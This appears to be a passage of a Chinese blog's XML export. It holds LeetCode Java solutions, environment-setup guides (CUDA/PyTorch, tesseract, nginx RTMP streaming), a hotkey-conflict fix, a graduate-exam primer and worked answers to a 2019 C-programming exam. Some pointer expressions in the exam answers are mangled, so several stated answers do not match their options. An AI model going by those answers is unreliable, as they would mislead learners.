    <content type="text"><![CDATA[题目：207. 课程表难度：中等 你这个学期必须选修 numCourse 门课程，记为 0 到 numCourse-1 。 在选修某些课程之前需要一些先修课程。 例如，想要学习课程 0 ，你需要先完成课程 1 ，我们用一个匹配来表示他们：[0,1] 给定课程总量以及它们的先决条件，请你判断是否可能完成所有课程的学习？ 示例 1: 123输入: 2, [[1,0]] 输出: true解释: 总共有 2 门课程。学习课程 1 之前，你需要完成课程 0。所以这是可能的。 示例 2: 123输入: 2, [[1,0],[0,1]]输出: false解释: 总共有 2 门课程。学习课程 1 之前，你需要先完成​课程 0；并且学习课程 0 之前，你还应先完成课程 1。这是不可能的。 提示： 输入的先决条件是由 边缘列表 表示的图形，而不是 邻接矩阵 。详情请参见图的表示法。 你可以假定输入的先决条件中没有重复的边。 1 &lt;= numCourses &lt;= 10^5 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/course-schedule著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 判断有向图是否有环问题，拓扑排序 解题代码12345678910111213141516171819202122232425262728293031323334353637class Solution &#123; public boolean canFinish(int numCourses, int[][] prerequisites) &#123; int[] inDegree = new int[numCourses]; // 计算每个节点的入度 for (int i = 0;i &lt; prerequisites.length;i++) &#123; inDegree[prerequisites[i][1]]++; &#125; // 入度为0，入栈，作为起始节点 Stack&lt;Integer&gt; stack = new Stack&lt;&gt;(); for (int i = 0;i &lt; inDegree.length;i++) &#123; if (inDegree[i] == 0) &#123; stack.push(i); &#125; &#125; // 计数 int count = 0; // 删掉入度为0的节点和与之相关联的边 while (!stack.isEmpty()) &#123; int pop = stack.pop(); count++; for (int i = 0;i &lt; prerequisites.length;i++) &#123; if (prerequisites[i][0] == pop) &#123; inDegree[prerequisites[i][1]]--; if (inDegree[prerequisites[i][1]] == 0) &#123; stack.push(prerequisites[i][1]); &#125; &#125; &#125; &#125; // 没有环的有向图节点数和拓扑排序的次数相同 return count == numCourses; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>拓扑排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/3]]></title>
    <url>%2Fposts%2F41d1f02f%2F</url>
    <content type="text"><![CDATA[题目：415. 字符串相加难度：简单 给定两个字符串形式的非负整数 num1 和num2 ，计算它们的和。 提示： num1 和num2 的长度都小于 5100 num1 和num2 都只包含数字 0-9 num1 和num2 都不包含任何前导零 你不能使用任何內建 BigInteger 库， 也不能直接将输入的字符串转换为整数形式 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/add-strings著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 从右到左遍历字符串，按位相加，然后处理好进位即可 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Solution &#123; public String addStrings(String num1, String num2) &#123; if (num1.length() &gt; num2.length()) &#123; return add(num1,num2); &#125; else &#123; return add(num2,num1); &#125; &#125; private String add(String longStr,String shortStr) &#123; StringBuilder builder = new StringBuilder(); int cur = 0; boolean flag = false; while (cur &lt; shortStr.length()) &#123; int a = longStr.charAt(longStr.length() - 1 - cur) - '0'; int b = shortStr.charAt(shortStr.length() - 1 - cur) - '0'; int c = a + b; // System.out.printf("%d+%d=%d\n",a,b,c); if (flag) &#123; c++; flag = false; &#125; if (c &gt; 9) &#123; flag = true; &#125; builder.append(c % 10); cur++; &#125; while (flag &amp;&amp; cur &lt; longStr.length()) &#123; flag = false; int a = longStr.charAt(longStr.length() - 1 - cur) - '0'; a++; if (a &gt; 9) &#123; flag = true; &#125; builder.append(a % 10); cur++; &#125; while (cur &lt; longStr.length()) &#123; builder.append(longStr.charAt(longStr.length() - 1 - cur)); cur++; &#125; if (flag) &#123; builder.append(1); &#125; return builder.reverse().toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次排查jetbrains系列ide（如idea，pycharm等） alt+f12 快捷键被占用问题解决过程]]></title>
    <url>%2Fposts%2Fb42d5264%2F</url>
    <content type="text"><![CDATA[前言 事件经过：最近不知怎么的了，博主的idea和pycharm等jetbrains系列ide突然都无法使用alt+f12（调出终端的）快捷键了，很让习惯了使用这个快捷键调出终端去执行git或者其他命令的博主不爽，于是便有了下面的探索过程 原因分析显然，无法使用快捷键的原因，明显是快捷键被某个程序占用了，或者说是热键冲突了 解决方案还是那句话，知道了原因之后，解决方案就好办了，大概的思路应该是下面这样 找到占用快捷键的程序，或者说找到快捷键冲突的原因 解决冲突 找到快捷键冲突原因通过搜索，博主发现windows下查看快捷键的工具有很多，比如Hotkey Exporer，PCHunter等等，但这二者都不好用，要么死机，要么驱动加载失败，但幸运的是，功夫不负有心人，最终博主找到了spy++这个强大的工具 下载spy++，某盘链接：https://pan.baidu.com/s/1OlesQcdGJZY2Xq4B-tZtAQ 提取码：46l3 解压到你喜欢的目录下，根据系统架构的不同，直接双击对应的exe执行 打开软件后，选择左上角菜单spy-&gt;log messages，弹出配置消息日志对话框 勾选all windows in system，然后选择message，感觉看文字描述不清晰的小伙伴，就看图 点击clear all，取消选中所有的消息 在上一张图蓝色下拉区域中，下拉到偏后的位置，选中wm_hotkey 然后按被占用的快捷键，我这里是 alt + f12 ，就会在窗体中出现一条消息记录 选中消息，右键点击properties，弹出属性对话框 在属性对话框中，点击蓝色的超链接 window handle 弹出具体的应用窗口属性对话框，在对话框中选择process面板，点击蓝色超链接，就会打开应用进程详情窗口 在应用详情窗口中，model name 就是占用 alt + f12 快捷键的应用的名称 通过搜索，发现这个应用是属于NVIDIA GeForce Experience的一个组件，到这里终于真相大白了 解决快捷键冲突由于经常使用jetbrains系列的ide，已经习惯了，而且如果要调整ide的快捷键，就要调整所有jetbrains系列ide的，比较多，麻烦，所以我选择了调整NVIDIA GeForce Experience的快捷键设置 打开GeForce Experience，点击右上角设置图标 注意到设置中的游戏内覆盖中有提示到按下 alt + z 分享游戏，猜想这里面应该有快捷键设置，点击设置，进入该设置详情 果不其然，在弹出的窗口中，我们发现了键盘快捷键设置按钮，点击它 在弹出来的面板中，我们果然发现了占用快捷键 alt + f12 的操作 点中它，按钮为绿色时，按下你想更新的快捷键（组合键），我这里设置为 shift + alt + f12 打开idea等jetbrains系列ide验证， alt + f12 成功调出终端，问题解决，enjoy！！！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>快捷键冲突</tag>
        <tag>jetbrains</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10下安装cuda+cudnn+pytorch]]></title>
    <url>%2Fposts%2F3908d582%2F</url>
    <content type="text"><![CDATA[准备 桌面右键选择NVIDIA控制面板，然后依次选择帮助-&gt;系统信息-&gt;组件 可以看到我这台笔记本支持的cuda版本是10.2.95，记住这个 然后去nvidia官网下载对应的驱动程序包 然后去下载对应的cudnn，下载cudnn需要NVIDIA账号，如果没有，建议使用163邮箱注册一个（为什么呢？因为QQ邮箱现在收不到NVIDIA的邮件，这就不知道到底是腾讯的问题还是英伟达的问题，亦或者是两者都有问题，手动狗头） 单独提一嘴，如果下载速度很慢的话，不要奇怪，国外的网站是这样的，想提高下载速度，请挂科学上网，或者是自己找大佬们下载好放在网盘里的资源 安装cuda 直接双击运行下载好的exe就行 基本都是下一步下一步下一步，没啥好说的 验证cuda，命令nvcc -V，看到如下图所示就行了 配置cudnn 解压cudnn压缩包 直接 Ctrl + A 全选，然后 Ctrl + C 复制，然后进入C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2目录下（请注意根据版本等选择对应的目录，不要无脑就直接用我这个目录）， Ctrl + V 粘贴 安装pytorch 去pytorch官网，根据操作系统，python包管理等选择对应的选项 复制上面选择后出现的安装命令，我这里选的是pip，命令行执行pip install torch===1.5.1 torchvision===0.6.1 -f https://download.pytorch.org/whl/torch_stable.html 等待安装完成，可能会比较慢，请挂科学上网 验证pytorch 进入python交互式解释器，cmd中执行python命令即可 参考官方示例进行验证 官方示例： 1234from __future__ import print_functionimport torchx = torch.rand(5, 3)print(x) 输出： 12345tensor([[0.3380, 0.3845, 0.3217],[0.8337, 0.9050, 0.2650],[0.2979, 0.7141, 0.9069],[0.1449, 0.1132, 0.1375],[0.4675, 0.3947, 0.1426]]) 验证cuda 官方示例： 12import torchtorch.cuda.is_available() 输出： 1True 验证通过，enjoy it!]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>cuda</tag>
        <tag>pytorch</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubantu配置安装tesseract-ocr]]></title>
    <url>%2Fposts%2Fc417f07b%2F</url>
    <content type="text"><![CDATA[ubantu 使用命令sudo apt install tesseract-ocr安装tesseract-ocr 使用命令whereis tesseract-ocr查看tesseract-ocr的位置 使用命令cd /usr/share/tesseract-ocr进入到tesseract-ocr的位置 使用命令ls查看该目录下有什么 使用命令cd tessdata/进入到tessdata目录 使用命令pwd打印当前工作目录，记录下打印出来的结果/usr/share/tesseract-ocr/tessdata 使用vim编辑/etc/profile，命令sudo vim /etc/profile 使用i进入insert模式，使用方向键，将光标移动到最末未位置，添加一行export TESSDATA_PREFIX=/usr/share/tesseract-ocr/tessdata :x保存并退出，使用source命令刷新/etc/profile enjoy it! centos7 先尝试安装tesseract，命令 1sudo yum install tesseract 如果安装成功，直接进入第6步，否则，从第2步往下依次执行 添加yum源，命令 1sudo yum-config-manager --add-repo https://download.opensuse.org/repositories/home:/Alexander_Pozdnyakov/CentOS_7/ 导入密钥，命令 1sudo rpm --import https://build.opensuse.org/projects/home:Alexander_Pozdnyakov/public_key 更新，命令 1sudo yum update 安装tesseract，命令 1sudo yum install tesseract 查看tesseract的位置，命令 1whereis tesseract 记住，图中标出来的位置/usr/share/tesseract cd到该位置，命令 1cd /usr/share/tesseract/ 列出该目录下的文件，命令 1ls 重复第7，8步骤，直到进入tessdata目录下 打印当前工作目录，命令 1pwd 记住打印出来的结果/usr/share/tesseract/4/tessdata 接下来的步骤和ubantu安装步骤的第7步往下是一模一样的了 其他操作系统请参考官方文档]]></content>
      <categories>
        <category>linux</category>
        <category>ubantu</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>tesseract-ocr</tag>
        <tag>ubantu</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx搭建直播服务器]]></title>
    <url>%2Fposts%2F7a7901bf%2F</url>
    <content type="text"><![CDATA[Linux下nginx源码安装并关联rtmp模块 卸载原有的nginx 1sudo apt autoremove nginx 下载nginx源码 1wget http://nginx.org/download/nginx-1.15.3.tar.gz 解压源码 1tar -zxvf nginx-1.15.3.tar.gz 下载nginx rtmp模块 1wget https://github.com/arut/nginx-rtmp-module/archive/v1.2.1.tar.gz 解压rtmp模块 1tar -zxvf v1.2.1.tar.gz 安装编译nginx所需要的库 1sudo apt install build-essential libpcre3 libpcre3-dev libssl-dev -y 进入nginx的解压目录 1cd nginx-1.15.3/ 关联rtmp模块 1./configure --prefix=./bin --add-module=../nginx-rtmp-module-1.2.1 编译安装 1make &amp;&amp; make install 启动nginx，查看效果 1./bin/sbin/nginx Linux下配置上一步安装好的nginx 编辑nginx配置文件 1vim bin/conf/nginx.conf 根结点下新增rtmp配置，如下 123456789101112rtmp &#123; server &#123; listen 1935; chunk_size 4000; application live &#123; live on; record off; allow play all; max_connections 1024; &#125; &#125;&#125; 保存后，重启nginx服务 1./bin/sbin/nginx -s reload windows下安装FFmpeg，用来推流 访问https://ffmpeg.zeranoe.com/builds/win64/static/ffmpeg-latest-win64-static.zip，下载最新版FFmpeg 解压到相关目录 Windows下使用FFmpeg进行推流测试 在上图中，框起来的地方输入cmd，按enter 推流，[host]换成你的服务器地址，[port]换成你的nginx监听rtmp协议的端口 1ffmpeg.exe -i 1.mp4 -f flv rtmp://[host]:[port]/live/room Windows下使用支持rtmp协议的播放器测试 以爱奇艺万能视频播放器举例 选择在线播放，输入地址rtmp://[host]:[port]/live/room，地址保证和你上面推流的地址相同即可 成功 附上一个使用video.js播放rtmp直播流视频的demo 注意：需要在服务器上运行，可以是本地服务器，不能直接使用浏览器打开 demo代码 1234567891011121314151617&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8" /&gt; &lt;title&gt;Player&lt;/title&gt; &lt;link href="https://unpkg.com/video.js/dist/video-js.css" rel="stylesheet"&gt;&lt;/head&gt;&lt;body&gt;&lt;video id="video" class="video-js vjs-default-skin" controls autoplay="autoplay" width="640" height="320" data-setup='&#123;&#125;'&gt; &lt;source src="rtmp://www.zimo.wiki/live/room" type="rtmp/flv" /&gt;&lt;/video&gt;&lt;script src="https://unpkg.com/video.js/dist/video.js"&gt;&lt;/script&gt;&lt;script src="https://cdn.jsdelivr.net/npm/videojs-flash@2/dist/videojs-flash.min.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 效果]]></content>
      <categories>
        <category>linux</category>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>linux</tag>
        <tag>直播服务器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科普文——考研须知]]></title>
    <url>%2Fposts%2F27a372c3%2F</url>
    <content type="text"><![CDATA[前言 &nbsp;&nbsp;&nbsp;&nbsp;最近不少同学向博主问起关于考研的一些问题，博主觉得这些问题可能是每个想考研的同学都会遇到的，比较有代表性，于是博主写下这篇文章在这里做一下统一的解答，同时也希望能对各位同学做出考研规划起到一定的帮助作用。博主将通过这篇文章向大家系统性的介绍一下考研。 关于硕士研究生的一些概念 &nbsp;&nbsp;&nbsp;&nbsp;中国实行的硕士研究生学位教育主要分为：学术型学位（学术理论研究）和专业型学位（注重操作实际能力）两种教育并轨，但一直以来，更偏重学术型学位教育，而少注重专业型学位教育，所以这导致了很多学术型学位研究生毕业后，只能大谈阔论，能理论能研究，但操作能力（这里其实很相对，毕竟学术能到这个阶段的人，只要不造假之类的，一般都不会太差，再弱也比很多本科生强）差。因此为了能与国际硕士研究生学位教育接轨，增加了专业型研究生教育。 学硕 &nbsp;&nbsp;&nbsp;&nbsp;学硕的全称是学术性硕士，顾名思义也就是注重学术方面研究的硕士研究生，再通俗一些就是学校以课本理论为主进行的人才培养。至于实践方面，可以说是辅助，而理论研究一定是被放在首要位置进行的培养内容。学术型硕士主要是为专业领域培养研究人员或者是为高校输送人才等。 专硕 &nbsp;&nbsp;&nbsp;&nbsp;专硕的全称是专业型硕士，与学硕进行对比就是重实践，轻理论。当然，这都是相对而言的，轻理论并不是完全忽视理论，而是与实践对比的情况下，学校会在实践方面花费大量的时间对学生进行培养，课本理论只是辅助，不作为重点培养方向。由此可见，专硕更像是为社会的各企业单位培养人才。 学硕和专硕的区别 &nbsp;&nbsp;&nbsp;&nbsp;专业型硕士学制一般为两年（但有的学校专硕也是三年），目的是为了培养一些应用型人才，培养方向更加注重实践操作，是为了给某个特定的职业培养掌握专业技能的和的高层次的人才，一般是想要在某个特定职业领域深入学习的人选择的学位。而学术型硕士的学制一般为三年（其实也有两年的，具体院校不同培养方案不同），主要是为了培养科学研究型人才，培养方向侧重理论教育，学术型硕士的就职方向多为大学教师和科研机构人员。&nbsp;&nbsp;&nbsp;&nbsp;另外二者的学费也不同，一般而言专业型硕士的学费要比学术型硕士高一些。 博主建议 &nbsp;&nbsp;&nbsp;&nbsp;读完硕士阶段就准备找工作的同学读专业型硕士更有帮助，而学术型硕士对打算继续读博士的人更好。 相关问题——学硕专硕到底哪个更好？ &nbsp;&nbsp;&nbsp;&nbsp;肯定还有一部分同学还是不能做出选择，就只想问一句——“学硕和专硕哪个更好？”。其实就实际而言，针对当今的社会的就业环境而言，并不是读学硕出来的同学就必须当科研人员，高校教师或者继续读博，专硕的同学就必须到公司工作，而不能搞研究，读博之类的，毕竟事无绝对。二者实际上没有那么绝对的限制，并且本身二者也就没有什么高低好坏，所以大家不应该去问学硕、专硕哪个更好，而应该把关注点放在自己的偏好和能力上，找到适合自己的方向就是最好的。&nbsp;&nbsp;&nbsp;&nbsp;所以最后的结论是，适合自己的才是最好的。 关于考研目标院校的一些概念 &nbsp;&nbsp;&nbsp;&nbsp;根据报考目标院校学科建设情况的不同，分为五类院校，由好到差分别是：985院校、211院校、双一流院校、双一流学科院校、一般院校。 985院校 &nbsp;&nbsp;&nbsp;&nbsp;985相信大家都听说过，这里不做过多概述，反正这个是最好的目标院校，但是最好也就意味着考上的难度最大。 211院校 &nbsp;&nbsp;&nbsp;&nbsp;211相信大家也都听说过，这里不做过多概述。 双一流院校 &nbsp;&nbsp;&nbsp;&nbsp;双一流院校是指学校的综合实力（几乎所有专业学科）达到了双一流的水平。 双一流学科院校 &nbsp;&nbsp;&nbsp;&nbsp;双一流学科院校是指学校的某（几）个学科达到了双一流的水平（有可能这个学科在全国排名都是靠前的，比如成都理工大学，地质科学专业全国第一，甚至连北大和清华都比不上，没什么好说的，毕竟著名地质学家，李xx就是成都理工大学毕业的）。注意区分双一流院校和双一流学科院校的区别。 一般院校 &nbsp;&nbsp;&nbsp;&nbsp;相对来说是最差的院校（尽管是最差的，也比二本院校强很多了，毕竟很多二本压根都没有研究生招生资格的），但是同时也代表着最容易考上。 关于考研的一些概念考研是什么 &nbsp;&nbsp;&nbsp;&nbsp;全国硕士研究生统一招生考试（Unified National Graduate Entrance Examination），简称“考研”。是教育主管部门和招生机构为选拔研究生而组织的相关考试的总称，是国家统考规格最高的考试（这里其实大家可能会有疑问，考研就最高了？那考博呢？需注意，考博已经不是全国统考了），跟高考一样，每年考一次。 考研包括哪些阶段 &nbsp;&nbsp;&nbsp;&nbsp;一般来说分为初试和复试两个阶段，初试时间一般在每年倒数第二个周末（一般来说大概在12月21号左右），复试时间根据报考单位的不同而有所不同（大部分是在3月中旬到5月初）。 考研初试科目和分数组成 政治：100分英语：100分数学或专业基础：150分专业课：150分总分：500分 考研初试科目考试范围和考试方式政治 考试方式：全国统考 考试范围：大学期间的所有思想政治课程公选课和时政（形势与政策），分别是：《思修》、《近代史》、《毛概》、《马原》、《当代时政》 英语 &nbsp;&nbsp;&nbsp;&nbsp;根据报考硕士类别的不同一般会有英语一和英语二的差别，一般学硕考英语一，专硕考英语二，难度英语一大于英语二，考试方式为全国统考。 数学或专业基础 &nbsp;&nbsp;&nbsp;&nbsp;数学分为数学一，数学二、数学三（只有经管专业考生考）。考试方式为全国统考。一般来说学硕考数学一，专硕考数学二，但也有部分院校考自命题（可能是数学自命题，可能是专业自命题，这个就属于专业基础的范围了），也有部分学校专硕也考数一，也有部分学校学硕也考数二，具体院校具体分析。数学一考试范围：《高等数学上、下》、《线性代数》、《概率论与数理统计》数学二考试范围：《高等数学上、下》（部分内容不考，如级数，三重积分等）、《线性代数》数学三考试范围：大部分同数一总结：数学一考的内容最多，数学二考的最少，但是考得最深（高数部分），而数学三的侧重点在于实际应用。 专业课 &nbsp;&nbsp;&nbsp;&nbsp;根据报考学校报考专业的不同而有所不同。一般来说，报考985/211的计算机专业是统考408。408考试范围：《数据结构》、《操作系统》、《计算机网络原理》、《计算机组成原理》 考研复试 &nbsp;&nbsp;&nbsp;&nbsp;复试是研究生考试制度的重要组成部分，即通过研究生入学考试（初试）后参加的，由报考院校组织进行的第二次考试。一般也分笔试和面试。早期的研究生复试多只是一种形式，但从引2006年起研究生招生加大了复试的权重，有的招生单位甚至把复试的权重加大至百分之五十，这就要求考生具有真才实学并具备更高的应变能力。复试考查范围极广。既有类似企业入职前的面试、笔试等阶段，又有英语口语的展示阶段。 关于考研的一些常见问题考研的信息从哪里获取？ &nbsp;&nbsp;&nbsp;&nbsp;唯一官方网站研招网 怎么选择报考学校？ &nbsp;&nbsp;&nbsp;&nbsp;根据个人情况和个人兴趣爱好去报考学校和专业。 考研应该从什么时候开始准备？ &nbsp;&nbsp;&nbsp;&nbsp;如果你志向远大，想考很好的学校，那么你就应该早做准备（最好从大一大二就开始）；如果你徘徊不定，犹豫不决，最晚你大四的时候就应该开始准备了，不过到了那个时候，你选择的学校一般不会太好，因为复习的时间不是特别充足。这个还得具体情况具体分析。 考研需要报班吗？ &nbsp;&nbsp;&nbsp;&nbsp;如果你是一个极其自律的人，那么你不需要报班；另一方面，如果你自认为不是自律的人的话，你可以报班，不过你得接受高额的费用。 考研应该怎么准备？ 确定目标院校，目标专业 确定学硕，专硕 确定考试科目 确定复习策略 持续努力，尽管大家都懂要想成功必须坚持努力这些道理，但其实能不能坚持下去真的得打上一个大大的问号？ 如有其它问题，欢迎联系博主或者直接留言，本文会及时更新致谢 全国硕士研究生统一招生考试 考研学硕和专硕究竟有哪些区别？差别很大！]]></content>
      <categories>
        <category>考研</category>
      </categories>
      <tags>
        <tag>考研</tag>
        <tag>科普</tag>
        <tag>常识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[成信大807程序综合设计2019年真题答案以及解析]]></title>
    <url>%2Fposts%2F28b181d9%2F</url>
    <content type="text"><![CDATA[单项选择题 C语言编译程序的首要工作是A. 检查C程序的完整性B. 检查C程序的逻辑错误C. 检查C程序的语法错误D. 生成目标文件答案：C解析：C语言编译程序的首要工作就是检查C语言程序中是否存在语法错误,如果有则给出错误的提示信息，如果没有则生成对应的目标文件(.obj) 能正确表示a和b同时为正或同时为负的逻辑表达式是A. (a&gt;=O||b&gt;=O)&amp;&amp;(a&lt;0||b&lt;0)B. (a&gt;=0&amp;&amp;b&gt;=0)&amp;&amp;(a&lt;0&amp;&amp;b&lt;0)C. (a+b&gt;0)&amp;&amp;(a+b&lt;=0)D. a*b&gt;0答案：D解析：D选项可由乘法运算法则得到；其他选项可以举反例，A选项反例是a = 1,b = -1，结果为真；B选项永远为假；C选项同样永远为假 下面程序运行后的输出结果是 123456789101112#include&lt;stdio.h&gt;int fun(int x)&#123; return x;&#125;int main()&#123; float a = 3.14; a = fun(a); printf("%.2f\n",a); return 0;&#125; A. 3.00 B. 3.14 C. 3 D. 0 答案：A 解析：函数参数类型以形参为准，在主函数调用fun函数的时候，传递的a是3.14，然后到了fun中就被强制转换为了整型数3，然后这个返回值又赋值到了a中，于是此时a中的值是浮点数3.0000（不精确的一个很接近3的小数值，浮点数都有误差），这里有一次自动类型转换，所以最后输出的结果是3.00 下面程序段执行后，a的值为static int s[2][4] = {0,1,2,3,4,5,6,7};int a,*p;p = &amp;s[0][1];// p指向了值为1的位置a = (*p)*(*p+3)*(*p+5);A. 28B. 15C. 24D. 不确定答案：C解析：作为取值运算符时，优先级较低，所以会先进行p+3的运算，然后再取值，p指向1的位置，p+3指向4的位置，所以\(p + 3)的值是4，同理，*(p+5)的值是6，最终a = 1 * 4 * 6 = 24，二维数组本身在内存中的存储方式是按一维数组存储的，连续的 在位运算中，操作数每左移1位，其结果相当于A. 操作数除以2B. 操作数乘以2C. 操作数除以4D. 操作数乘以4答案：B解析：计算机底层的数据只有2进制，以最常见的八位二进制数00000001（十进制数1）为例，左移一位将变为00000010（十进制数2），最高位的0将会被丢掉（左移不管最高位是0还是1，都会丢掉），所以左移相当于是x2，同理，右移，有一点点小区别，最低位的0被丢掉了（右移不管最低位是0还是1，都会丢掉），然后最高位空了，这是不行的，计算机会进行高位补0的操作，所以右移相当于/2，看不懂我的叙述就在纸上模拟一般这个过程，大概就明白了 若有定义int a[3][4];则输入其3行2列元素的正确语句是A. scanf(“%d”,a[3,2]);B. scanf(“%d”,*(*(a+2)+1));C. scanf(“%d”,(a+2)+1);D. scanf(“%d”,(a[2]+1);答案：C解析：3行2列元素是a[2][1]，scanf函数的参数是指针（地址值），所以合法的应该是&amp;a[2][1]，而&amp;a[2][1]等价于*((a+2)+1) 将p定义为指向含4个元素的一维数组的指针变量，正确语句是A. int (p)[4];B. int *p[4];C. int *p[4];D. int p[4];答案：A解析：B选项是指针数组；C选项也是指针数组；D选项就是数组 有如下定义:struct person {char name[9];int age;};struct person class[10]=({&quot;Johu&quot;,17,&quot;Paul&quot;,19,&quot;Mary&quot;,18,&quot;Adam&quot;,16};根据上述定义，能输出字母M的语句是A. print(“%c\n”,class[3].name);B. print(“%c\n”,class[3].name[1]);C. print(“%c\n”,class[2].name[1);D. print(“%c\n”,class[2].name[0]);答案：D解析：class[2]是{“Mary”,18}，class[2].name[0]就是字母’M’ 若已建立下图所示的单链表结构:在该链表结构中，指针p、s分别指向图中所示结点，则不能将s所指的结点插入到链表末尾仍构成单向链表的语句组是A. p=p-&gt;next; s-&gt;next=p; p-&gt;next=s;B. p=p-&gt;next; s-&gt;next=p-&gt;next; p-&gt;next=s;C. s~&gt;next=NULL; p=p-&gt;next; p-&gt;next=s;D. p=(*p).next; (*s).next=(*p).next; (*p).next-s;答案：A解析：p=p-&gt;next;将p后移了一个，现在的p指向末尾的结点了，s-&gt;next=p;将p，也就是链表的末尾赋值给s的指针域，s-&gt;next现在指向末尾结点位置，p-&gt;next=s，将s赋值给p的指针域，也就是现在链表末尾的结点指向s，没有构成链表，换句话说，这样的操作导致链表断掉了 在一个源文件中，定义的全局变量的作用域为A. 本文件的全部范围B. 从定义该变量的位置开始至本文件结束C. 本函数的全部范围D. 本程序的全部范围答案：B解析：多次强调过全局变量的作用域了，如还不知道，请翻阅前几年的真题解析 判断题 用do-while语句构成的循环，在while后的表达式为零时结束循环答案：√解析：这里的表达式指的是是do{}while(表达式)语句中，while后面括号里的表达式 在用字符串常量初始化字符数组时，数组长度应等于字符串有效字符的个数答案：×解析：一般数组长度应该大于字符串有效字符的个数，因为末尾会自动加上结束符’\0’，但是实际情况中，用这种方式初始化的时候，一般不指定数组长度，由编译器自动确定 若使用数组名作为函数调用的实参，则传递给形参的是实参数组中全部元素的值答案：×解析：传递的是数组首地址，一般情况下，数组名都代表数组首地址 在C语言复合语句中定义的变量只在该复合语句中有效答案：√解析：在复合语句（一般是由一对花括号中间的语句块）中定义的变量也是局部变量，作用范围自然是从定义的地方开始，到语句块结束 在switch语句中break语句必须和case配对使用答案：×解析：default后也可写break 函数调用时，如果形参和实参的类型不一致,以实参为准答案：×解析：应该以形参为准，这样的函数调用过程，会存在自动类型转换的过程 自增运算符(++)或自减运算符(--)只能用于变量，不能用于常量或表达式答案：√解析：不能用于常量是一定的，这里解释下为什么不能用于表达式，这是因为表达式一旦确定（表达式的操作数确定，表达式的运算符确定），表达式的值其实就已经确定了，而表达式的值是CPU调度程序完成计算之后，临时存储在寄存器中的，所以相当于常量，不能修改 若定义int(*p)[];则p是一个指向一维数组的指针变量答案：×解析：没给大小，这里必须要指定大小，代表指向有几个元素的一维数组指针变量 数组初始化时被赋值的元素的个数决定了这个数组所占内存单元的个数答案：×解析：数组的大小在声明时已经给出，而不是由初始化被赋值元素的个数决定的 在程序中定义一个结构体类型后，编译器将为结构体的各成员分配存储空间答案：×解析：定义类型并不会分配空间，只有在定义变量时才会分配内存空间 程序分析题 阅读程序，描述程序的功能，当输入: Zhangsen 28/Liming 58/Liuwei 40/时，写出运行结果。(/表示回车，后同) 12345678910111213141516171819202122#include&lt;stdio.h&gt;struct person&#123; char name[20]; int age;&#125;man[3];int main()&#123; int i,key = 0; struct person *p,*q; for (i = 0;i &lt; 3;i++) scanf("%s %d",man[i].name,&amp;man[i].age); for (p = man;p &lt; man + 3;p++) &#123; if (p-&gt;age &gt; key) &#123; q = p; key = p-&gt;age; &#125; &#125; printf("%s,%d\n",q-&gt;name,q-&gt;age); return 0;&#125; 答案： 功能：输入三个人的姓名和年龄，存入结构体数组中，输出三者中年龄最高的人的所有信息 输出结果：Liming,58 阅读程序，描述程序的功能，写出程序运行结果 1234567891011121314151617181920212223#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main()&#123; char str1[100],str2[100]; char *p1,*p2; int k,j,i,len; p1 = str1; p2 = str2; scanf("%s",p1); scanf("%s",p2); k = j = i = 0; len = strlen(str2); while (p1[k] != '\0' &amp;&amp; p2[j] !='\0') &#123; if (p1[k] == p2[j]) &#123;k++;j++;&#125; else &#123;i++;k = i;j = 0;&#125; &#125; if (j &gt;= len) printf("Yes\n"); else printf("No\n"); return 0;&#125; 答案： 功能：输入两个字符串str1和str2，判断str2是不是str1的子串，是就输出Yes，否则输出No输出结果： 当输入: asdfgrty qwert/时，程序运行结果为: 当输入: asdfgrty fgrt/时，程序运行结果为: 阅读程序，描述程序的功能，当输入：This is a test of C Program Language!/，写出程序运行结果 12345678910111213141516#include"stdio.h"int main()&#123; char str[80]; int i = 0; gets(str); while (str[i] != '\0') &#123; if (str[i] &gt;= 'a' &amp;&amp; str[i] &lt;= 'z') str[i] = str[i] - 'a' + 'A'; else if (str[i] &gt;= 'A' &amp;&amp; str[i] &lt;= 'Z') str[i] = str[i] - 'A' + 'a'; i++; &#125; printf("%s\n",str); return 0;&#125; 答案： 功能：将输入的字符串中的字母进行字母大小写互换输出结果：tHIS IS A TEST OF c pROGRAM lANGUAGE! 程序设计题 请编写函数fun,函数的功能是求出二维数组a周边元素之和，作为函数值返回。例如:若二维数组如下:1 3 5 7 92 9 9 9 46 9 9 9 81 3 5 7 0则函数返回值为61。在主函数中赋予二维数组(大小为M*N, M、N由符号常量确定)值，调用fun函数进行计算，并输出计算结果。要求自行设计fun函数，在主函数中，输入、输出时，应显示适当提示信息答案： 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#define M 4#define N 5int fun(int a[M][N])&#123; int sum = 0,i,j; for (i = 0;i &lt; M;i++) &#123; for (j = 0;j &lt; 